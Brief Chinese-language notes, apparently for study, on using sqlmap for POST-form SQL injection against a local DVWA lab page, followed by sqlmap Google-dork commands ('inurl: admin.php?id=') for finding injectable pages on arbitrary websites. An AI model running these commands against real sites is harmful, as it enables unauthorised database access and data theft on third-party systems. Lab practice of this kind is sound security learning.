# sqlmap post注入

1.

找到注入提交的表单 `http://dvwa.localhost/vulnerabilities/xss_s/`

```
python2.7 sqlmap.py -u "http://dvwa.localhost/vulnerabilities/xss_s/" --cookie="PHPSESSID=sm4ui6j4hros62n7vie2c845m3; security=low" --data="txtName=11&mtxMessage=111&btnSign=Sign+Guestbook" --dbs
```

刷新该页面，会有变化

跳过确认操作 `--batch --smart`

```
python2.7 sqlmap.py -u "http://dvwa.localhost/vulnerabilities/xss_s/" --cookie="PHPSESSID=sm4ui6j4hros62n7vie2c845m3; security=low" --data="txtName=11&mtxMessage=111&btnSign=Sign+Guestbook" --dbs --batch --smart
```



2.寻找注入点，不能连接谷歌只能手动寻找注入点

```
 python2.7 sqlmap.py -g "inurl: admin.php?id="
```



关键词

```
 python2.7 sqlmap.py -g "inurl:\". php.?id=\""
```

